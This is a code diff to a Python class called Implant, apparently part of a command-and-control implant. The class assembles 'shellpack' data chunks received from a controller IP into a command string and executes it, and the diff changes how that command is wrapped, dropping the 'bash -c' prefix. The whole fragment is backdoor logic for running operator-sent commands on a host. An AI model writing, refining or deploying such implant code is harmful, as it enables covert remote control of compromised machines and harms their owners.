@@ -20,7 +20,7 @@ class Implant(Host):
     def __init__(self, controller_ip):
         super().__init__()
         self.controller_ip = controller_ip
-        self.module_cache = "bash -c \""
+        self.module_cache = """"""
         
 
     def join(self, shellpack):
@@ -36,14 +36,12 @@ class Implant(Host):
         elif shellpack['option'] == "COMPLETE":
             self.module_cache += shellpack['data'].decode()
             print(self.module_cache)
-            self.module_cache += "\""
             self.run_command(self.module_cache)
-            self.module_cache = "bash -c \""
+            self.module_cache = """"""
         else:
             self.module_cache += shellpack['data'].decode()
-            self.module_cache += "\""
             self.run_command(self.module_cache)
-            self.module_cache = "bash -c \""
+            self.module_cache = """"""
 
     def run_command(self, cmd):
         try:
